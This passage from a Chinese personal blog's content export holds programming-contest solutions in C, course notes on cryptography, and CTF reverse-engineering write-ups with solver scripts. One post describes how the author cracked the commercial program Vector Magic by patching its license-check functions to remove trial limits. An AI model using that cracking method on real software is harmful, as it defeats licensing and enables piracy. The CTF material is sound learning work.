work()&#123; scanf(\"%s\",a); int len=strlen(a); if(len==1&amp;&amp;!(a[0]&gt;='0'&amp;&amp;a[0]&lt;='9')) switch(a[0]) &#123; case '+':return work() + work(); case '-':return work() - work(); case '*':return work() * work(); case '/':return work() / work(); &#125; else &#123; return atof(a); &#125;&#125;int main()&#123; printf(\"%f\",work());&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"Vigenère密码题解","slug":"vigenere-e5-af-86-e7-a0-81-e9-a2-98-e8-a7-a3","date":"2018-12-06T15:37:40.000Z","updated":"2019-05-05T05:43:55.818Z","comments":true,"path":"posts/4c789951/","link":"","permalink":"https://mrh1s.top/posts/4c789951/","excerpt":"","text":"08:Vigenère密码 总时间限制: 1000ms 内存限制: 65536kB 描述 16世纪法国外交家Blaise de Vigenère设计了一种多表密码加密算法——Vigenère密码。Vigenère密码的加密解密算法简单易用，且破译难度比较高，曾在美国南北战争中为南军所广泛使用。 在密码学中，我们称需要加密的信息为明文，用M表示；称加密后的信息为密文，用C表示；而密钥是一种参数，是将明文转换为密文或将密文转换为明文的算法中输入的数据，记为k。在Vigenère密码中，密钥k是一个字母串，k=k1k2…kn。当明文M=m1m2…mn时，得到的密文C=c1c2…cn，其中ci=mi®ki，运算®的规则如下表所示： Vigenère加密在操作时需要注意： ®运算忽略参与运算的字母的大小写，并保持字母在明文M中的大小写形式； 当明文M的长度大于密钥k的长度时，将密钥k重复使用。 例如，明文M=Helloworld，密钥k=abc时，密文C=Hfnlpyosnd。 明文 H e l l o w o r l d 密钥 a b c a b c a b c a 密文 H f n l p y o s n d 输入 输入共2行。第一行为一个字符串，表示密钥k，长度不超过100，其中仅包含大小写字母。第二行为一个字符串，表示经加密后的密文，长度不超过1000，其中仅包含大小写字母。 对于100%的数据，输入的密钥的长度不超过100，输入的密文的长度不超过1000，且都仅包含英文字母。 输出 输出共1行，一个字符串，表示输入密钥和密文所对应的明文。 样例输入 CompleteVictory Yvqgpxaimmklongnzfwpvxmniytm 样例输出 Wherethereisawillthereisaway 来源 NOIP2012复赛 提高组 第一题 题解：注意本题是由密文解密为原文。由于密钥和密文需要进行相互运算，所以转换大小写是必不可少的，题目有要求原文大小写与密文一致，所以我们可以用一个数组 int miwen_x[2000] 来储存原文大小写的数据 读入密文、密钥，转换大小写并且记录密文的大小写状况 接着就是解密数据了，让我们来观察一下Vigenère密码的规律吧 ​ 本表指 一对密钥与原文可以加密成密文，现在要翻译密文，也就是知道对应的点，也知道了y轴坐标，求x轴坐标。 1. 当密文≥密钥时，我们发现数据是依次递增的，则此时ans[i]= miwen[i]-key[j]+’a’ 2. 当密文&lt;密钥时，数据由最右端向左依次递减，此时ans[i]= ‘z’-(key[j]-miwen[i]-1) j的意义在后面。 注意这里还有一个易错点，密钥的长度可能小于密文的长度，那么当密钥较短时就要运用循环多次使用此密钥 int j=0; 并且在每次循环后 j++; if(j==strlen(key)) j=0; 最后通过miwen_x[i]的值将原文的大小写形式恢复原样 这样就解决此问题了 本题总思路： 1. 读入密钥、密文并转换成小写（大写也可），同时记录密文的大小写情况 2. 运用算法算出原文 3. 通过大小写情况恢复原文的大小写 #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; #include&lt;string.h&gt; #include&lt;math.h&gt; int change(int i)//大小写转换 { return (i&gt;=&apos;A&apos;&amp;&amp;i&lt;=&apos;Z&apos;)?i+&apos;a&apos;-&apos;A&apos;:i; }​ int main()&#123; char key[120]; char miwen[1200]; int miwen_x[1200];//密文大小写 1小写 2大写 scanf(\"%s %s\",key,miwen); int len=strlen(key); for(int i=0;i&lt;=len-1;i++) key[i]=change(key[i]); for(int i=0;i&lt;=strlen(miwen)-1;i++) &#123; if(miwen[i]&gt;='A'&amp;&amp;miwen[i]&lt;='Z') miwen_x[i]=2; else miwen_x[i]=1; miwen[i]=change(miwen[i]); &#125; char ans[1200]; int j=0; for(int i=0;i&lt;=strlen(miwen)-1;i++) &#123; if(miwen[i]&gt;=key[j]) ans[i]=miwen[i]-key[j]+'a'; else ans[i]='z'-(key[j]-miwen[i]-1); if(miwen_x[i]==2) ans[i]=ans[i]-('a'-'A'); j++; if(j==len) j=0; &#125; ans[strlen(miwen)]=0; printf(\"%s\",ans); return 0;&#125; ​","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"铺地毯题解","slug":"e9-93-ba-e5-9c-b0-e6-af-af-e9-a2-98-e8-a7-a3","date":"2018-12-06T15:36:10.000Z","updated":"2019-05-05T05:37:48.915Z","comments":true,"path":"posts/e5abdd9c/","link":"","permalink":"https://mrh1s.top/posts/e5abdd9c/","excerpt":"","text":"14:铺地毯 总时间限制: 1000ms 内存限制: 65536kB 描述 为了准备一个独特的颁奖典礼，组织者在会场的一片矩形区域（可看做是平面直角坐标系的第一象限）铺上一些矩形地毯。一共有n张地毯，编号从1到n。现在将这些地毯按照编号从小到大的顺序平行于坐标轴先后铺设，后铺的地毯覆盖在前面已经铺好的地毯之上。地毯铺设完成后，组织者想知道覆盖地面某个点的最上面的那张地毯的编号。注意：在矩形地毯边界和四个顶点上的点也算被地毯覆盖。 输入输出样例1说明：如下图，1号地毯用实线表示，2号地毯用虚线表示，3号用双实线表示，覆盖点（2，2）的最上面一张地毯是3号地毯。 输入输出样例2说明：如下图，1号地毯用实线表示，2号地毯用虚线表示，3号用双实线表示，覆盖点（4，5）的最上面一张地毯是3号地毯。 输入 输入共n+2行。第一行，一个整数n，表示总共有n张地毯。接下来的n行中，第i+1行表示编号i的地毯的信息，包含四个正整数a，b，g，k，每两个整数之间用一个空格隔开，分别表示铺设地毯的左下角的坐标（a，b）以及地毯在x轴和y轴方向的长度。第n+2行包含两个正整数x和y，表示所求的地面的点的坐标（x，y）。 对于30%的数据，有n≤2；对于50%的数据，0≤a, b, g, k≤100；对于100%的数据，有0≤n≤10,000，0≤a, b, g, k≤100,000。 输出 输出共1行，一个整数，表示所求的地毯的编号；若此处没有被地毯覆盖则输出-1。 样例输入 样例 #1： 3 1 0 2 3 0 2 3 3 2 1 3 3 2 2 样例 #2： 3 1 0 2 3 0 2 3 3 2 1 3 3 4 5 样例输出 样例 #1： 3 样例 #2： -1 来源 NOIP2011复赛 提高组 第一题 题解 根据习惯性思维，看到这道题我们通常会建一个二维数组，用二维数组的每个元素来表示各个点的地毯覆盖情况。这样的方法可行，但是效率较低，不适合数据过大的运算，本题n&lt;=10000。 仔细审题，我们发现题目所需要的仅仅是一个点的地毯覆盖情况，所以撒大网的方式并不是最优的算法。 于是就考虑对于目标点单独进行操作，题目给出了毯子左下角的坐标，也给出了毯子的长宽，通过这两组数据我们就可以求到毯子的四个角所在的坐标，然后判断该点是否存在于此范围中，然后进行操作就可以了。 先建立一个二维数组，第一个下标表示毯子的次序，第二个下标分别用1,2,3,4来表示该毯子的左下角坐标a，b 和 长宽g，k int a[20020][4]; int log=-1 读入相应数据与目标点后，开始操作 循环判断目标点是否在相应毯子中，如果是则将负责记录的变量更新 for(int i=1;i&lt;=n;i++) if(x&lt;=a[i][1]+a[i][3]&amp;&amp;x&gt;=a[i][1]&amp;&amp;y&lt;=a[i][2]+a[i][4]&amp;&amp;y&gt;=a[i][2]) log=i; 如果无一个毯子符合条件，则log=-1 输出，AC！ #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main()&#123; int n; int a[10001][5]; int x,y; scanf(\"%d\",&amp;n); for(int i=1;i&lt;=n;i++) scanf(\"%d %d %d %d\",&amp;a[i][1],&amp;a[i][2],&amp;a[i][3],&amp;a[i][4]); scanf(\"%d %d\",&amp;x,&amp;y); int log=-1; for(int i=1;i&lt;=n;i++) if(x&lt;=a[i][1]+a[i][3]&amp;&amp;x&gt;=a[i][1]&amp;&amp;y&lt;=a[i][2]+a[i][4]&amp;&amp;y&gt;=a[i][2]) log=i; printf(\"%d\",log); return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"螺旋矩阵题解","slug":"e8-9e-ba-e6-97-8b-e7-9f-a9-e9-98-b5-e9-a2-98-e8-a7-a3","date":"2018-12-06T15:33:09.000Z","updated":"2019-05-05T05:35:36.900Z","comments":true,"path":"posts/148b5576/","link":"","permalink":"https://mrh1s.top/posts/148b5576/","excerpt":"","text":"螺旋矩阵 (matrix.cpp) 【问题描述】 一个n行n列的螺旋矩阵可由如下方法生成： 从矩阵的左上角（第1行第1列）出发，初始时向右移动；如果前方是未曾经过的格子， 则继续前进，否则右转；重复上述操作直至经过矩阵中所有格子。根据经过顺序，在格子中依次填入1, 2, 3, … , n2，便构成了一个螺旋矩阵。 下图是一个n = 4 时的螺旋矩阵。 现给出矩阵大小n以及i和j，请你求出该矩阵中第i行第j列的数是多少。 【输入】 输入文件名为matrix.in。 输入共一行，包含三个整数n，i，j，每两个整数之间用一个空格隔开，分别表示矩阵大小、待求的数所在的行号和列号。 【输出】 输出文件名为matrix.out。 输出共一行，包含一个整数，表示相应矩阵中第i行第j列的数。 【输入输出样例】 matrix.in matrix.out 4 2 3 14 【数据说明】 对于50%的数据，1 ≤ n ≤ 100; 对于100%的数据，1 ≤ n ≤ 30,000，1 ≤ i ≤ n，1 ≤ j ≤ n 首先看到这个题目 能想到的是数字由内而外的螺旋矩阵，就可以从内圈开始逐步模拟推出各个方框的数字，最后得出结果。 这样就可以得到规律：以左上角为坐标原点，向下为y轴正半轴，向右为x轴正半轴。 当n为偶数时，起点在(n/2+1,(n+1)/2)处。 当n为奇数时，起点在((n+1)/2, (n+1)/2)处。 那么就令int x,y为相应的数作为起点坐标，旋转规律如下： 数字递减的方向由 右 上 左 下的顺序进行旋转，每次改变方向，该点便沿此方向平移k次，然后再旋转，平移k（k=1）次，然后旋转，此时平移k+1次，以此类推，方向每改变两次，k=k+1。 运用int dir来储存方向 dir/4=1,2,3,4为每次平移的方向。 建立循环 for(int p=n;p&gt;=1;p–) 将矩阵枚举出来后，就可以输出相应点的值了。 但是本题n&lt;=30000 那么数组就要开9*10^8，既浪费空间也浪费时间，而且无法开出，所以这种方法在本题只适用前50%的数据。 那么怎么在不开数组、尽量不计算无关点的值就得出目标值呢？ 通过观察，发现矩阵是由n/2层构成，每层格数相差2格，对顶角上的点的值变化也有规律，如果我们找到了目标点所在的层数，就能通过较少的平移求出答案，而不是浪费资源。 至于层数的寻找，在i,j∈n/2时是容易的， i,j中的最小值即为层数，层数ceng=i&gt;j?j:i。 如果目标在其他位置，可通过对称的方式用相同的方法求出层数。 当i&gt;n/2 i’=1+(n-i) j同理。 接下来可求到此层左上角的点的值： int p=1 for(int m=1;m&lt;=ceng;m++) P+=4*(n-1); 运用刚才的平移法则，可求到相应的点。 再优化： 当j&gt;x且i=y时p(目标)=p+(j-x) ，平移判断 当i&gt;y且j=x时p(目标)=p+(i-y) ，平移 判断 当x&gt;j且i=y时p(目标)=p+(x-j) ，平移 判断 当y&gt;i且j=x时p(目标)=p+(y-i) 判断 这样就可以AC了 #include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;algorithm&gt;#include&lt;stdio.h&gt;int main()&#123; freopen(\"matrix.in\",\"r\",stdin); freopen(\"matrix.out\",\"w\",stdout); int n,i,j; scanf(\"%d %d %d\",&amp;n,&amp;i,&amp;j); int x=j,y=i; int a=n/2; if(n%2==0)//判断该数属于第几行 &#123; if(x&gt;a) x=1+(n-x); if(y&gt;a) y=1+(n-y); &#125; else &#123; if(x&gt;a+1) x=1+(n-x); if(y&gt;a+1) y=1+(n-y); &#125; int ceng=x&lt;y?x:y; x=1;y=1; int p=1; for(int m=1;m&lt;ceng;m++) &#123; p+=4*(n-1); n-=2; x++; y++; &#125; if(y==i) &#123; p+=j-x; printf(\"%d\",p); return 0; &#125; p+=n-1; x+=n-1; if(x==j) &#123; p+=i-y; printf(\"%d\",p); return 0; &#125; p+=n-1; y+=n-1; if(y==i) &#123; p+=x-j; printf(\"%d\",p); return 0; &#125; p+=n-1; x-=n-1; if(x==j) &#123; p+=y-i; printf(\"%d\",p); return 0; &#125; return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"来一次迁移工作吧","slug":"e6-9d-a5-e4-b8-80-e6-ac-a1-e8-bf-81-e7-a7-bb-e5-b7-a5-e4-bd-9c-e5-90-a7","date":"2018-12-06T15:22:31.000Z","updated":"2019-05-04T15:39:44.410Z","comments":true,"path":"posts/2889ce1/","link":"","permalink":"https://mrh1s.top/posts/2889ce1/","excerpt":"","text":"CSDN闲置很久没用了，今天登上去发现大量两年前写的题解，甚是怀念，现把其全部迁移至本博客","categories":[{"name":"牢骚","slug":"牢骚","permalink":"https://mrh1s.top/categories/牢骚/"}],"tags":[]},{"title":"网络安全课笔记 of Shijie Zhou #1","slug":"e7-bd-91-e7-bb-9c-e5-ae-89-e5-85-a8-e8-af-be-e7-ac-94-e8-ae-b0-of-shijie-zhou","date":"2018-12-06T13:58:05.000Z","updated":"2019-05-05T05:34:18.513Z","comments":true,"path":"posts/76551050/","link":"","permalink":"https://mrh1s.top/posts/76551050/","excerpt":"","text":"周世杰一改以往作风，拿来点名册抽人回答问题 有节课没去的我瑟瑟发抖 信息安全基础知识信息，信息技术（3C，传感） 信息安全： ​ 1.通信安全 ​ 2.信息安全（五大属性） ​ 3.信息保障（强调过程） 网络空间安全：​ 从信息基础设施的角度去考虑、通信设备 密码学基础知识密码算法的分类 ​ 1.对称（DES、AES）与非对称（RSA、ECC） ​ 2.分组（用于有线通信）/流密码（用于无线通信、RC4） 对称加密算法特点：加密速度快，安全性较低 非对称加密算法特点：加密速度慢，安全性较强 会话密钥：用非对称加密算法加密数据，用对称加密算法加密密钥，再把密钥分发 非对称加密算法的提出： ​ 1.密钥如何安全分发，在不安全的信道上如何通信？（Merkle难题，短密钥加密长密钥） ​ 2.非对称加密算法的基本思想：数学难题（大整数因子分解，欧拉数，欧拉定理，欧几里德算法） 公钥可信问题： ​ PKI-&gt;证书签名（用私钥去加密证书内容的hash值） 单向函数： ​ 正向计算简单，逆向计算复杂（MD5，SHA-1，王小云）","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[]},{"title":"Some Boxes","slug":"some-boxes","date":"2018-11-30T16:50:47.000Z","updated":"2019-05-04T15:39:44.405Z","comments":true,"path":"posts/6dada2a6/","link":"","permalink":"https://mrh1s.top/posts/6dada2a6/","excerpt":"","text":"download here 有效的输入字符只有’4’,‘5’,‘W’,‘0’，读到这些字符的时候会对给定的一个字符数组进行修改。 正在用 ‘DFS’ 跑字符串，但是效率太低了，枚举到长度15以上的字符串就得跑好几个小时。 总觉得有高级做法…… 高级做法：推箱子游戏 [&#39;W&#39;,&#39;5&#39;,&#39;4&#39;,&#39;0&#39;] [&#39;up&#39;,&#39;down&#39;,&#39;left&#39;,&#39;right&#39;] s0:start a1:box1 a2:boxl2 14:target 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 0808 08 08 08 08 08 08 08 08 08 08 0808 08 a2 08 08 0808 08 08 08 08 08 08 0808 08 08 08 08 08 08 14 0808 08 08 s0 08 08 08 08 08 0808 08 08 08 08 08 08 08 08 08 08 08 0808 08 08 08 08 08 08 a1 08 08 08 0808 08 14 08 08 08 08 0808 08 08 08 08 08 0808 08 08 08 08 08 0808 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 走法：WW44W444W45555555450050W0000WWWWW55555444444WWWWWWW000050050W4W0000W0550544","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nctf_20181124","slug":"write-up/nctf-20181124","permalink":"https://mrh1s.top/categories/write-up/nctf-20181124/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}]},{"title":"基本操作 Reverse Version","slug":"e5-9f-ba-e6-9c-ac-e6-93-8d-e4-bd-9c-reverse-version","date":"2018-11-30T16:48:57.000Z","updated":"2019-05-04T15:39:44.404Z","comments":true,"path":"posts/28572e84/","link":"","permalink":"https://mrh1s.top/posts/28572e84/","excerpt":"","text":"download here ida得到加密算法 # 翻译的太丑 太丑flag=\"\"s_change1=\"\"c=0def change1(a): if a&lt;64: v1=c c+=1 s_change1[v1]=flag[a] change1(2*a+1) res=change1(2*(a+1)) return res 对输入的字符串进行了一次先序遍历和一次中序遍历 出题人的意思应该是已知先序遍历和中序遍历求原二叉树。。 却没想到原二叉树是个满二叉树，直接通过一种遍历方式就可以推出原二叉树 （或者是出题人发题之前把难度降低了嘤嘤嘤，出题人别捶我别捶我） 这里只给出用先序遍历求原二叉树的代码 #include&lt;cstdio&gt;char str[] = \"bcec8d7dcda25d91ed3e0b720cbb6cf202b09fedbc3e017774273ef5d5581794\";char p[65];int cnt;void fuck(int t)&#123; if(t &gt;= 64) return; p[t] = str[cnt++]; fuck(2 * t + 1); fuck(2 * (t + 1));&#125;int main()&#123; fuck(0); printf(\"%s\",p);&#125; ​","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nctf_20181124","slug":"write-up/nctf-20181124","permalink":"https://mrh1s.top/categories/write-up/nctf-20181124/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}]},{"title":"Our 16bits wars","slug":"our-16bits-wars","date":"2018-11-30T16:43:04.000Z","updated":"2019-05-04T15:39:44.403Z","comments":true,"path":"posts/eb65a69a/","link":"","permalink":"https://mrh1s.top/posts/eb65a69a/","excerpt":"","text":"download here 下载一个dos_box 跑一跑，发现是输入flag之后对flag进行操作，之后比较和加密的字符串是否相等 对于每一位字符p ((p&gt;&gt;3)^(p&lt;&lt;5))^0xff 与 数据表中的值相等 然后暴力枚举，爆破。 （这是char变量所以注意&amp;0xff，不然数据溢出） table=[0xC9, 0x68, 0x8A, 0xC8, 0x6F, 0x07, 0x6, 0xF, 0x7, 0xC6, 0xEB,0x86,0x6E,0x6E, 0x66, 0xAD, 0x4C, 0x8D, 0xAC, 0xEB, 0x26,0x6E, 0xEB, 0xCC, 0xAE, 0xCD, 0x8C, 0x86, 0xAD, 0x66, 0xCD,0x8E, 0x86, 0x8D, 0xAF]ans=\"\"for i in range(0x23): for p in range(32,127): if ((p&gt;&gt;3)^(p&lt;&lt;5))&amp;0xff==table[i]: ans+=chr(p) breakprint(ans)","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nctf_20181124","slug":"write-up/nctf-20181124","permalink":"https://mrh1s.top/categories/write-up/nctf-20181124/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}]},{"title":"Vector Majic","slug":"vector-majic-e7-a0-b4-e8-a7-a3-e5-bf-83-e5-be-97","date":"2018-10-13T04:56:55.000Z","updated":"2019-05-04T15:39:44.402Z","comments":true,"path":"posts/6d22fa14/","link":"","permalink":"https://mrh1s.top/posts/6d22fa14/","excerpt":"","text":"商用软件 Vector Magic (点我下载) 可以将位图矢量化。 要求 破除Trial版本的广告窗口与使用限制，让程序表现与购买版本完全一致。(获得基础分值) 在上一条的基础上，将程序标题改为 Vector Magic Edition，主界面 More Options-&gt;About Vector Magic Desktop Edition 窗口最底部显示 Registered to 。(获得150%基础分值) 破解过程​ 最开始的思路是把注册(activate)的过程patch掉，搞了很久玄学出不来结果，连注册成功对话框都出了，软件还是注册不成功。 ​ 后发现About中有关于是否注册的字符串提示，故搜索，发现其每次会调用一个验证函数A，patch掉即可，如此一来保存功能便可以使用了。 ​ 然而程序左上角仍然存在一个trial version 的窗口，这是整个破解过程中卡我最久的地方。我曾去调试了整个窗口生成的全过程，发现并没有任何判断函数参与，特别是我patch的那个验证函数A。 ​ 没想到验证函数A里面还嵌套了一个验证函数B（哭 。生成广告的过程与A无关而与B有关，然而我在查看A时并没有发现该判断。这是因为ida F5把test al,al 指令识别为了某一个函数的参数，从而我没有发现if条件语句，每每想到这里我就是一阵唏嘘。tm的以后再也不用ida去调长代码了！ （真香 ​ 关于更改标题，搜索字符串即可。心得：如果修改后的字符串比原来长，可以找一块空白的内存将字符串贴上去，并且改汇编代码使其指向新地址。 总结动态调试就是玄学，靠运气。以后做题前最好吸吸欧气^ ^","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"cnss_recruit_201809","slug":"write-up/cnss-recruit-201809","permalink":"https://mrh1s.top/categories/write-up/cnss-recruit-201809/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"RE_Dynamic","slug":"RE-Dynamic","permalink":"https://mrh1s.top/tags/RE-Dynamic/"}]},{"title":"莫名其妙的https配置错误","slug":"e8-8e-ab-e5-90-8d-e5-85-b6-e5-a6-99-e7-9a-84https-e9-85-8d-e7-bd-ae-e9-94-99-e8-af-af","date":"2018-10-03T15:42:50.000Z","updated":"2019-05-04T15:39:44.402Z","comments":true,"path":"posts/3f79aed7/","link":"","permalink":"https://mrh1s.top/posts/3f79aed7/","excerpt":"","text":"在宝塔面板中打开了https，还在wordpress中把网站地址改成了https开头，没想到整个网站都上不去了。只好重新搭建，结果依旧，最后查询发现https协议要通过443端口，原来和shadowsocks冲突了，改掉ss端口，解决。","categories":[{"name":"牢骚","slug":"牢骚","permalink":"https://mrh1s.top/categories/牢骚/"}],"tags":[]},{"title":"Hello world!","slug":"hello-world-2","date":"2018-10-03T11:08:44.000Z","updated":"2019-05-04T15:39:44.400Z","comments":true,"path":"posts/1b851995/","link":"","permalink":"https://mrh1s.top/posts/1b851995/","excerpt":"","text":"这是mrh929的第一篇博客，受yypE学长的网站所启发（其实是他扔给我了一篇教程），利用一下午时间+9元域名注册费完成了这个具体而微的网站。 以后的学习之路还很漫长。Let’s get started！","categories":[{"name":"牢骚","slug":"牢骚","permalink":"https://mrh1s.top/categories/牢骚/"}],"tags":[]}]}